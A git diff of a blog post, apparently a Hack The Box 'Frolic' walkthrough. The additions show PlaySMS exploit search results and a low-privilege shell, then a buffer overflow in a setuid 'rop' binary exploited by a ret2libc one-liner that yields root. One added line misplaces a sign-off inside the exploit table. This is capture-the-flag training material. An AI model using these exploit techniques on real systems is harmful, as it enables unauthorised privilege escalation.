@@ -12,6 +12,8 @@ tags:
     - linux
 ---
 
+This was a good practice of decoding stuff, web exploitation and rop exploitation. Overall a decent box and easy points. Getting user was tiring but root was fun and it did give me some ideas on future blog posts.
+
 ![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/banner.PNG)
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
@@ -240,7 +242,8 @@ PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metas
 PlaySMS 1.4 - Remote Code Execution                                                                                                                                                          | exploits/php/webapps/42038.txt
 PlaySms 0.7 - SQL Injection                                                                                                                                                                  | exploits/linux/remote/404.pl
 PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                                               | exploits/php/webapps/26871.txt
-PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                                        | exploits/php/webapps/7687.txt
+PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                                        | exploits/php/webapps/7687.txtHappy Hacking! Cheers!
+
 PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                                                      | exploits/php/webapps/17792.txt
 PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                                                 | exploits/php/webapps/30177.txt
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
@@ -263,4 +266,52 @@ www-data
 /var/www/html/playsms
 ```
 
-So we have a low privilege shell. 
+So we have a low privilege shell. Using some `stty` and `python` magic, I was able to upgrade to a full shell.
+
+```bash
+www-data@frolic:/home/ayush$ cat user.txt
+2******************************0
+```
+
+Looking around, we have the `user.txt` file. On to root!
+
+```bash
+www-data@frolic:/home/ayush/.binary$ ls -l
+total 8
+-rwsr-xr-x 1 root root 7480 Sep 25 00:59 rop
+```
+
+I found a `rop` binary in the home directory of `ayush`. I am assuming that we would have to do some `rop` to do privilege escalation. So let's check for `ASLR`.
+
+```bash
+www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+So, ASLR is disabled. I downloaded the binary on my local machine to try and debug it.
+
+```bash
+root@kali# ./rop
+[*] Usage: program <message>
+
+root@kali# ./rop $(python -c 'print "A"*10')
+[+] Message sent: AAAAAAAAAA
+
+root@kali# ./rop $(python -c 'print "A"*500')
+Segmentation fault
+```
+
+I will be posting a tutorial `rop` exploitation soon. But, long story short, I got the addresses for `SYSTEM`, `exit` and `/bin/sh` on the box and used them to create an exploit and did the following.
+
+```bash
+www-data@frolic:/home/ayush/.binary$ ./rop $(python -c 'print("a"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x0b\x4a\xf7\xb7")')
+# id
+root
+# cat root.txt
+8******************************2
+```
+
+Voila! We have the `root.txt` file.
+It was a decent box except the continuous decoding. But obtaining the root was a good exercise.
+
+Happy Hacking! Cheers!
